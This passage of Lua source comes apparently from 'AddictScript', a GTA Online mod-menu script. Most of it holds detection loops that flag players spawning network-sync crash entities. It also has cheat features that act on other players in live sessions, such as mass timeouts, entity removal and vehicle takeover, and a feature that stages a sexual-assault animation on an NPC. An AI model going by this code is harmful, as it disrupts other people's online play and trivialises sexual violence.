						if natives.GET_PED_PALETTE_VARIATION(peds[i], comp) ~= 0 and memory.is_script_entity(peds[i]) and not ped.is_ped_a_player(peds[i]) then
							GuiltyPlayer = memory.get_entity_owner(peds[i])
						end
					end
				end
			end
			if GuiltyPlayer ~= nil and GuiltyPlayer ~= player.player_id() then
				if player.is_player_valid(GuiltyPlayer) then
					if not ModderDetections.NetworkSyncCrash.PedComponent1[GuiltyPlayer] then
						if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(GuiltyPlayer)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(GuiltyPlayer)) then
							if f.value == 0 or f.value == 2 then
								player.set_player_as_modder(GuiltyPlayer, custommodderflags["Network Sync Crash"])
							end
							if f.value == 0 or f.value == 1 then
								menu.notify("Player: " .. tostring(player.get_player_name(GuiltyPlayer)) .. "\nReason: Network Sync Crash | Ped Component 1", "AddictScript Modder Detection", 12, NotifyColours["orange"])
							end
							ModderDetections.NetworkSyncCrash.PedComponent1[GuiltyPlayer] = true
						end
					end
				end
			end
		end
		system.yield(2000)
	end
end)
feature["Ped Component 1 Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Ped Component 2 Detection"] = menu.add_feature("Ped Component 2", "value_str", localparents["Network Sync Crash Detection"].id, function(f)
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() and interior.get_interior_from_entity(player.get_player_ped(player.player_id())) == 0 then
			local GuiltyPlayer
			local peds = ped.get_all_peds()
			for i = 1, #peds do
				if not network.has_control_of_entity(peds[i]) then
					if ped.get_ped_drawable_variation(peds[i], 2) > 48 and memory.is_script_entity(peds[i]) and not ped.is_ped_a_player(peds[i]) then
						GuiltyPlayer = memory.get_entity_owner(peds[i])
					end
				end
			end
			if GuiltyPlayer ~= nil and GuiltyPlayer ~= player.player_id() then
				if player.is_player_valid(GuiltyPlayer) then
					if not ModderDetections.NetworkSyncCrash.PedComponent2[GuiltyPlayer] then
						if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(GuiltyPlayer)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(GuiltyPlayer)) then
							if f.value == 0 or f.value == 2 then
								player.set_player_as_modder(GuiltyPlayer, custommodderflags["Network Sync Crash"])
							end
							if f.value == 0 or f.value == 1 then
								menu.notify("Player: " .. tostring(player.get_player_name(GuiltyPlayer)) .. "\nReason: Network Sync Crash | Ped Component 2", "AddictScript Modder Detection", 12, NotifyColours["orange"])
							end
							ModderDetections.NetworkSyncCrash.PedComponent2[GuiltyPlayer] = true
						end
					end
				end
			end
		end
		system.yield(2000)
	end
end)
feature["Ped Component 2 Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Vehicle Component Type 2 Detection"] = menu.add_feature("Vehicle Component Type 2", "value_str", localparents["Network Sync Crash Detection"].id, function(f)
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() and interior.get_interior_from_entity(player.get_player_ped(player.player_id())) == 0 then
			local GuiltyPlayer
			local vehicles = vehicle.get_all_vehicles()
			for i = 1, #vehicles do
				if not network.has_control_of_entity(vehicles[i]) then
					if entity.get_entity_model_hash(vehicles[i]) == 4039289119 and vehicle.get_vehicle_mod(vehicles[i], 34) == 3 then
						GuiltyPlayer = memory.get_entity_owner(vehicles[i])
					end
				end
			end
			if GuiltyPlayer ~= nil and GuiltyPlayer ~= player.player_id() then
				if player.is_player_valid(GuiltyPlayer) then
					if not ModderDetections.NetworkSyncCrash.VehicleComponentType2[GuiltyPlayer] then
						if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(GuiltyPlayer)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(GuiltyPlayer)) then
							if f.value == 0 or f.value == 2 then
								player.set_player_as_modder(GuiltyPlayer, custommodderflags["Network Sync Crash"])
							end
							if f.value == 0 or f.value == 1 then
								menu.notify("Player: " .. tostring(player.get_player_name(GuiltyPlayer)) .. "\nReason: Network Sync Crash | Vehicle Component Type 2", "AddictScript Modder Detection", 12, NotifyColours["orange"])
							end
							ModderDetections.NetworkSyncCrash.VehicleComponentType2[GuiltyPlayer] = true
						end
					end
				end
			end
		end
		system.yield(2000)
	end
end)
feature["Vehicle Component Type 2 Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Sync Type Mismatch 1 Detection"] = menu.add_feature("Sync Type Mismatch 1", "value_str", localparents["Network Sync Crash Detection"].id, function(f)
	local NonInvalidPara = {3430676794, 1298918533, 1931904776, 3255984827, 1336576410, 3981285813, 1740193300, 218548447, 2170442475, 1654893215, 2235049942, 230075693, 3316027, 2514357004}
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() and interior.get_interior_from_entity(player.get_player_ped(player.player_id())) == 0 then
			local GuiltyPlayer
			local vehicles = vehicle.get_all_vehicles()
			for i = 1, #vehicles do
				if not network.has_control_of_entity(vehicles[i]) then
					local HasInvalidPara = true
					for para = 1, #NonInvalidPara do
						if vehicle.get_vehicle_parachute_model(vehicles[i]) == NonInvalidPara[para] then
							HasInvalidPara = false
						end
					end
					if HasInvalidPara then
						GuiltyPlayer = memory.get_entity_owner(vehicles[i])
					end
				end
			end
			if GuiltyPlayer ~= nil and GuiltyPlayer ~= player.player_id() then
				if player.is_player_valid(GuiltyPlayer) then
					if not ModderDetections.NetworkSyncCrash.SyncTypeMismatch1[GuiltyPlayer] then
						if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(GuiltyPlayer)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(GuiltyPlayer)) then
							if f.value == 0 or f.value == 2 then
								player.set_player_as_modder(GuiltyPlayer, custommodderflags["Network Sync Crash"])
							end
							if f.value == 0 or f.value == 1 then
								menu.notify("Player: " .. tostring(player.get_player_name(GuiltyPlayer)) .. "\nReason: Network Sync Crash | Sync Type Mismatch 1", "AddictScript Modder Detection", 12, NotifyColours["orange"])
							end
							ModderDetections.NetworkSyncCrash.SyncTypeMismatch1[GuiltyPlayer] = true
						end
					end
				end
			end
		end
		system.yield(2000)
	end
end)
feature["Sync Type Mismatch 1 Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Sync Type Mismatch 2 Detection"] = menu.add_feature("Sync Type Mismatch 2", "value_str", localparents["Network Sync Crash Detection"].id, function(f)
	local NonInvalidPara = {3430676794, 1298918533, 1931904776, 3255984827, 1336576410, 3981285813, 1740193300, 218548447, 2170442475, 1654893215, 2235049942, 230075693, 3316027, 2514357004}
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() and interior.get_interior_from_entity(player.get_player_ped(player.player_id())) == 0 then
			local objects = object.get_all_objects()
			for i = 1, #objects do
				if not network.has_control_of_entity(objects[i]) then
					if memory.is_script_entity(objects[i]) and streaming.is_model_a_world_object(entity.get_entity_model_hash(objects[i])) then
						GuiltyPlayer = memory.get_entity_owner(objects[i])
					end
				end
			end
			if GuiltyPlayer ~= nil and GuiltyPlayer ~= player.player_id() then
				if player.is_player_valid(GuiltyPlayer) then
					if not ModderDetections.NetworkSyncCrash.SyncTypeMismatch2[GuiltyPlayer] then
						if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(GuiltyPlayer)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(GuiltyPlayer)) then
							if f.value == 0 or f.value == 2 then
								player.set_player_as_modder(GuiltyPlayer, custommodderflags["Network Sync Crash"])
							end
							if f.value == 0 or f.value == 1 then
								menu.notify("Player: " .. tostring(player.get_player_name(GuiltyPlayer)) .. "\nReason: Network Sync Crash | Sync Type Mismatch 2", "AddictScript Modder Detection", 12, NotifyColours["orange"])
							end
							ModderDetections.NetworkSyncCrash.SyncTypeMismatch2[GuiltyPlayer] = true
						end
					end
				end
			end
		end
		system.yield(2000)
	end
end)
feature["Sync Type Mismatch 2 Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Invalid Decor Int Detection"] = menu.add_feature("Invalid Decor Int", "value_str", localparents["Network Sync Crash Detection"].id, function(f)
	local NonInvalidPara = {3430676794, 1298918533, 1931904776, 3255984827, 1336576410, 3981285813, 1740193300, 218548447, 2170442475, 1654893215, 2235049942, 230075693, 3316027, 2514357004}
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() and interior.get_interior_from_entity(player.get_player_ped(player.player_id())) == 0 then
			local GuiltyPlayer
			local NetworkHashes = {}
			for pid = 0, 31 do
				if player.is_player_valid(pid) then
					NetworkHashes[#NetworkHashes + 1] = network.network_hash_from_player(pid)
				end
			end
			local vehicles = vehicle.get_all_vehicles()
			for i = 1, #vehicles do
				if not network.has_control_of_entity(vehicles[i]) then
					local HasInvalidDecor = false
					if decorator.decor_exists_on(vehicles[i], "PYV_Owner") and decorator.decor_exists_on(vehicles[i], "PYV_Vehicle") and decorator.decor_exists_on(vehicles[i], "PYV_Yacht") and decorator.decor_exists_on(vehicles[i], "Player_Vehicle") then
						for v = 1, #NetworkHashes do
							if decorator.decor_get_int(vehicles[i], "PYV_Owner") == NetworkHashes[i] and decorator.decor_get_int(vehicles[i], "PYV_Vehicle") == NetworkHashes[i] and decorator.decor_get_int(vehicles[i], "PYV_Yacht") == NetworkHashes[i] then
								HasInvalidDecor = true
							end
						end
					end
					if HasInvalidDecor and interior.get_interior_from_entity(vehicles[i]) == 0 then
						GuiltyPlayer = memory.get_entity_owner(vehicles[i])
					end
				end
			end
			if GuiltyPlayer ~= nil and GuiltyPlayer ~= player.player_id() then
				if player.is_player_valid(GuiltyPlayer) then
					if not ModderDetections.NetworkSyncCrash.InvalidDecorInt[GuiltyPlayer] then
						if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(GuiltyPlayer)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(GuiltyPlayer)) then
							if f.value == 0 or f.value == 2 then
								player.set_player_as_modder(GuiltyPlayer, custommodderflags["Network Sync Crash"])
							end
							if f.value == 0 or f.value == 1 then
								menu.notify("Player: " .. tostring(player.get_player_name(GuiltyPlayer)) .. "\nReason: Network Sync Crash | Invalid Decor Int", "AddictScript Modder Detection", 12, NotifyColours["orange"])
							end
							ModderDetections.NetworkSyncCrash.InvalidDecorInt[GuiltyPlayer] = true
						end
					end
				end
			end
		end
		system.yield(2000)
	end
end)
feature["Invalid Decor Int Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Whitelist Friends From Detections"] = menu.add_feature("Whitelist Friends", "toggle", localparents["Modder Detections"].id, function(f)
end)

feature["Whitelist Whitelisted Players From Detections"] = menu.add_feature("Whitelist Whitelisted Players", "toggle", localparents["Modder Detections"].id, function(f)
end)

localparents["Modder Options"] = menu.add_feature("Modder Options", "parent", localparents["Modder Detections"].id)

feature["Mark"] = menu.add_feature("Mark", "action_value_str", localparents["Modder Options"].id, function(f)
	for pid = 0, 31 do
		if player.is_player_valid(pid) then
			if f.value == 0 then
				player.set_player_as_modder(pid, -1)
				for k, v in pairs(Detections) do
					v[pid] = true
				end
			else
				player.set_player_as_modder(pid, 1 << f.value - 1)
			end
		end
	end
end)
feature["Mark"]:set_str_data(DataMain.all_modder_flags_table)

feature["Unmark"] = menu.add_feature("Unmark", "action_value_str", localparents["Modder Options"].id, function(f)
	for pid = 0, 31 do
		if player.is_player_valid(pid) then
			if f.value == 0 then
				player.unset_player_as_modder(pid, -1)
				for k, v in pairs(Detections) do
					v[pid] = nil
				end
			else
				player.unset_player_as_modder(pid, 1 << f.value - 1)
			end
		end
	end
end)
feature["Unmark"]:set_str_data(DataMain.all_modder_flags_table)

feature["Notify"] = menu.add_feature("Notify", "action_value_str", localparents["Modder Options"].id, function(f)
	for pid = 0, 31 do
		if player.is_player_valid(pid) then
			if f.value == 0 then
				for i = 1, #DataMain.all_modder_flags_table do
					menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: " .. DataMain.all_modder_flags_table[i], "Modder Detection", 12, 0x00A2FF)
				end
			else
				menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: " .. player.get_modder_flag_text(1 << f.value - 1), "Modder Detection", 12, 0x00A2FF)
			end
		end
	end
end)
feature["Notify"]:set_str_data(DataMain.all_modder_flags_table)

feature["Whitelist"] = menu.add_feature("Whitelist", "toggle", localparents["Modder Options"].id, function(f)
	for pid = 0, 31 do
		if player.is_player_valid(pid) then
			menu.get_feature_by_hierarchy_key("online.online_players.player_" .. pid .. ".modder_detection.whitelist").on = f.on
		end
	end
end)

feature["Timeout"] = menu.add_feature("Timeout", "action_value_i", localparents["Modder Options"].id, function(f)
	for pid = 0, 31 do
		if player.is_player_valid(pid) then
			if not AddictScriptIsPlayerTimeout[pid] and f.value > 0 then
				player_func.timeout_player(pid, f.value * 1000)
			end
		end
	end
end)
feature["Timeout"].max = 60
feature["Timeout"].min = 0
feature["Timeout"].mod = 10
feature["Timeout"].value = 0

localparents["Disable Modder Detections"] = menu.add_feature("Disable Modder Detections", "parent", localparents["Modder Detections"].id)

do
	for i = 0, 100 do
		if player.get_modder_flag_text(1 << i) ~= "" then
			feature["Disable Modder Detection " .. i] = menu.add_feature(player.get_modder_flag_text(1 << i), "toggle", localparents["Disable Modder Detections"].id, function(f)
				if f.on then
					listeners["Disable Modder Detection " .. i] = event.add_event_listener("modder", function(modder_player)
						if modder_player.flag == 1 << i then
							player.unset_player_as_modder(modder_player.player, modder_player.flag)
						end
					end)
				end
				if not f.on then
					if listeners["Disable Modder Detection " .. i] then
						event.remove_event_listener("modder", listeners["Disable Modder Detection " .. i])
						listeners["Disable Modder Detection " .. i] = nil
					end
				end
			end)
		end
	end
end

localparents["Spawner"] = menu.add_feature("Spawner", "parent", localparents["Addict Script"].id)

localparents["Editor Mode"] = menu.add_feature("Editor Mode", "parent", localparents["Spawner"].id)

feature["Enable Editor Mode"] = menu.add_feature("Enable Editor Mode", "toggle", localparents["Editor Mode"].id, function(f)
end)

feature["Editor Mode Enter"] = menu.add_feature("Enter", "action", localparents["Editor Mode"].id, function(f)
	if feature["Enable Editor Mode"].on then
		local Entity = player.get_entity_player_is_aiming_at(player.player_id())
		if Entity ~= nil then
			if entity.is_entity_a_ped(Entity) and ped.is_ped_in_any_vehicle(Entity) then
				Entity = ped.get_vehicle_ped_is_using(Entity)
			end
			if entity.is_entity_a_vehicle(Entity) then
				if ped.is_ped_a_player(vehicle.get_ped_in_vehicle_seat(Entity, -1)) then
					ped.set_ped_into_vehicle(player.get_player_ped(player.player_id()), Entity, -2)
				else
					utilities.request_control(vehicle.get_ped_in_vehicle_seat(Entity, -1))
					utilities.request_control(Entity)
					ped.set_ped_into_vehicle(vehicle.get_ped_in_vehicle_seat(Entity, -1), Entity, -2)
					ped.set_ped_into_vehicle(player.get_player_ped(player.player_id()), Entity, -1)
				end
			end
		end
	end
end)

feature["Editor Mode Delete"] = menu.add_feature("Delete", "action", localparents["Editor Mode"].id, function(f)
	if feature["Enable Editor Mode"].on then
		local Entity = player.get_entity_player_is_aiming_at(player.player_id())
		if Entity ~= nil then
			if entity.is_entity_a_ped(Entity) and ped.is_ped_in_any_vehicle(Entity) then
				Entity = ped.get_vehicle_ped_is_using(Entity)
			end
			if entity.is_an_entity(Entity) then
				utilities.request_control(Entity, 1000)
				entity.delete_entity(Entity)
			end
		end
	end
end)

feature["Editor Mode Hard Remove"] = menu.add_feature("Hard Remove", "action", localparents["Editor Mode"].id, function(f)
	if feature["Enable Editor Mode"].on then
		local Entity = player.get_entity_player_is_aiming_at(player.player_id())
		if Entity ~= nil then
			if entity.is_entity_a_ped(Entity) and ped.is_ped_in_any_vehicle(Entity) then
				Entity = ped.get_vehicle_ped_is_using(Entity)
			end
			if entity.is_an_entity(Entity) then
				utilities.request_control(Entity, 1000)
				entity_func.hard_remove_entity(Entity)
			end
		end
	end
end)

feature["Editor Mode Delete Locally"] = menu.add_feature("Delete Locally", "action", localparents["Editor Mode"].id, function(f)
	if feature["Enable Editor Mode"].on then
		local Entity = player.get_entity_player_is_aiming_at(player.player_id())
		if Entity ~= nil then
			if entity.is_entity_a_ped(Entity) and ped.is_ped_in_any_vehicle(Entity) then
				Entity = ped.get_vehicle_ped_is_using(Entity)
			end
			if entity.is_an_entity(Entity) then
				entity_func.delete_locally(Entity)
			end
		end
	end
end)

feature["Editor Mode Rape"] = menu.add_feature("Rape", "action", localparents["Editor Mode"].id, function(f)
	if feature["Enable Editor Mode"].on then
		local Entity = player.get_entity_player_is_aiming_at(player.player_id())
		if Entity ~= nil then
			if entity.is_an_entity(Entity) and entity.is_entity_a_ped(Entity) and not ped.is_ped_in_any_vehicle(Entity) and not ped.is_ped_a_player(Entity) and not entity.is_entity_dead(Entity) then
				streaming.request_anim_dict("rcmpaparazzo_2")
				streaming.request_anim_set("shag_loop_poppy")
				while not streaming.has_anim_dict_loaded("rcmpaparazzo_2") do
					system.yield(0)
					streaming.request_anim_dict("rcmpaparazzo_2")
					streaming.request_anim_set("shag_loop_poppy")
				end
				if utilities.request_control(Entity) then
					entity.set_entity_heading(Entity, player.get_player_heading(player.player_id()))
					ai.task_play_anim(Entity, "rcmpaparazzo_2", "shag_loop_poppy", 1, 0, 20000, 9, 0, true, true, network.is_session_started())
					natives.SET_ENTITY_NO_COLLISION_ENTITY(player.get_player_ped(player.player_id()), Entity, false)
					entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), utilities.offset_coords(entity.get_entity_coords(Entity), entity.get_entity_heading(Entity), 0.3, 3))
					streaming.request_anim_dict("rcmpaparazzo_2")
					streaming.request_anim_set("shag_loop_a")
					while not streaming.has_anim_dict_loaded("rcmpaparazzo_2") do
						system.yield(0)
						streaming.request_anim_dict("rcmpaparazzo_2")
						streaming.request_anim_set("shag_loop_a")
					end
					natives.FREEZE_ENTITY_POSITION(Entity, true)
					natives.SET_ENTITY_NO_COLLISION_ENTITY(player.get_player_ped(player.player_id()), Entity, false)
					for i = 1, 40 do
						entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), utilities.offset_coords(entity.get_entity_coords(Entity), entity.get_entity_heading(Entity), 0.3, 3))
						entity.set_entity_heading(player.get_player_ped(player.player_id()), entity.get_entity_heading(Entity) - 8)
						system.yield(10)
					end
					entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), utilities.offset_coords(entity.get_entity_coords(Entity), entity.get_entity_heading(Entity), 0.3, 3))
					entity.set_entity_heading(player.get_player_ped(player.player_id()), entity.get_entity_heading(Entity) - 8)
					ai.task_play_anim(player.get_player_ped(player.player_id()), "rcmpaparazzo_2", "shag_loop_a", 1, 0, 20000, 9, 0, true, true, network.is_session_started())
					menu.notify("Get some bitches smh", AddictScript, 8, NotifyColours["blue"])
					local time = utils.time_ms() + 20000
					while time > utils.time_ms() and not entity.is_entity_dead(player.get_player_ped(player.player_id())) and not entity.is_entity_dead(Entity) do
						if natives.IS_ENTITY_PLAYING_ANIM(Entity, "rcmpaparazzo_2", "shag_loop_poppy", 3) then
							if math.random(1, 100) == 1 then
								natives.PLAY_PAIN(Entity, math.random(6, 7), 0, 0)
							end
						end
						natives.SET_ENTITY_NO_COLLISION_ENTITY(player.get_player_ped(player.player_id()), Entity, true)
						system.yield(0)
					end
					natives.FREEZE_ENTITY_POSITION(Entity, false)
					ai.stop_anim_task(Entity, "rcmpaparazzo_2", "shag_loop_poppy", 1.0)
					natives.CLEAR_PED_TASKS(Entity)
					natives.CLEAR_PED_SECONDARY_TASK(Entity)
					ai.stop_anim_task(player.get_player_ped(player.player_id()), "rcmpaparazzo_2", "shag_loop_a", 1.0)
					natives.CLEAR_PED_TASKS(player.get_player_ped(player.player_id()))
					natives.CLEAR_PED_SECONDARY_TASK(player.get_player_ped(player.player_id()))
				end
			end
		end
	end
end)

feature["Editor Mode Spectate Control"] = menu.add_feature("Remote Spectate", "toggle", localparents["Editor Mode"].id, function(f)
	if f.on then
		IsRemoteControllingVehicle = false
		if feature["Enable Editor Mode"].on then
			local Entity = player.get_entity_player_is_aiming_at(player.player_id())
			if Entity ~= nil then
				if entity.is_entity_a_ped(Entity) and ped.is_ped_in_any_vehicle(Entity) then
					Entity = ped.get_vehicle_ped_is_using(Entity)
				end
				if entity.is_an_entity(Entity) then
					IsRemoteControllingVehicle = true
					RemoteControlCam = natives.CREATE_CAM_WITH_PARAMS("DEFAULT_SCRIPTED_CAMERA", entity.get_entity_coords(Entity), 0.0, 0.0, 0.0, 70.0, false, false)
					natives.SET_CAM_ACTIVE(RemoteControlCam, true)
					natives.RENDER_SCRIPT_CAMS(true, false, 0, false, false, false)
					natives.ATTACH_CAM_TO_ENTITY(RemoteControlCam, Entity, 0.0, -12.0, 5.0, true)
					while f.on do
						natives.DISABLE_ALL_CONTROL_ACTIONS(0)
						natives.SET_CAM_ROT(RemoteControlCam, entity.get_entity_rotation(Entity), 2)
						natives.SET_FOCUS_POS_AND_VEL(natives.GET_CAM_COORD(RemoteControlCam), 0.0, 0.0, 0.0)
						natives.LOCK_MINIMAP_POSITION(natives.GET_CAM_COORD(RemoteControlCam).x, natives.GET_CAM_COORD(RemoteControlCam).y)
						system.yield(0)
					end
					natives.SET_CAM_ACTIVE(RemoteControlCam, false)
					natives.RENDER_SCRIPT_CAMS(false, false, 0, false, false, false)
					natives.DESTROY_CAM(RemoteControlCam, false)
					natives.UNLOCK_MINIMAP_POSITION()
					natives.CLEAR_FOCUS()
					natives.ENABLE_ALL_CONTROL_ACTIONS(0)
					IsRemoteControllingVehicle = false
				end
			end
		end
	end
	if f.on then
		f.on = false
	end
end)

localparents["Display Debug Info"] = menu.add_feature("Display Debug Info", "parent", localparents["Editor Mode"].id)

feature["Entity Debug Info"] = menu.add_feature("Entity Debug Info", "toggle", localparents["Display Debug Info"].id, function(f)
	while f.on do
		system.yield(0)
		if player.is_player_free_aiming(player.player_id()) then
			local entity_debug_info_entity = player.get_entity_player_is_aiming_at(player.player_id())
			if entity.is_entity_a_ped(entity_debug_info_entity) and not ped.is_ped_in_any_vehicle(entity_debug_info_entity) and not ped.is_ped_a_player(entity_debug_info_entity) then
				ui.set_text_scale(feature["Debug Info Text Size 2"].value)
				ui.set_text_font(feature["Debug Info Text Font 2"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Ped", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.5 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Hash: " .. tostring(entity.get_entity_model_hash(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.53 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Health: " .. text_func.round(ped.get_ped_health(entity_debug_info_entity)) .. "/" .. text_func.round(ped.get_ped_max_health(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.55 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Dead: " .. tostring(entity.is_entity_dead(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.57 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("God: " .. tostring(entity.get_entity_god_mode(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.59 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Visible: " .. tostring(entity.is_entity_visible(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.61 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Has Control: " .. tostring(network.has_control_of_entity(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.63 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Attached: " .. tostring(entity.is_entity_attached(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.65 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Dead: " .. tostring(entity.is_entity_dead(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.67 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Networked: " .. tostring(natives.NETWORK_GET_ENTITY_IS_NETWORKED(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.69 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Frozen: " .. tostring(memory.is_entity_frozen(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.71 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Net ID: " .. tostring(natives.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity_debug_info_entity)), v2(0.5 + feature["Debug Info Text X Offset"].value, 0.73 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Script ID: " .. tostring(natives.NETWORK_GET_ENTITY_NET_SCRIPT_ID(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.75 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Script Char: " .. tostring(natives.GET_ENTITY_SCRIPT(entity_debug_info_entity, 0)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.77 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Money: " .. tostring(natives.GET_PED_MONEY(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.79 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Position: " .. text_func.round_two_dc(entity.get_entity_coords(entity_debug_info_entity).x) .. ", " .. text_func.round_two_dc(entity.get_entity_coords(entity_debug_info_entity).y) .. ", " .. text_func.round_two_dc(entity.get_entity_coords(entity_debug_info_entity).z) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.53 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Rotation: " .. text_func.round_two_dc(entity.get_entity_rotation(entity_debug_info_entity).x) .. ", " .. text_func.round_two_dc(entity.get_entity_rotation(entity_debug_info_entity).y) .. ", " .. text_func.round_two_dc(entity.get_entity_rotation(entity_debug_info_entity).z) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.55 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Heading: " .. text_func.round_two_dc(entity.get_entity_heading(entity_debug_info_entity)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.57 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
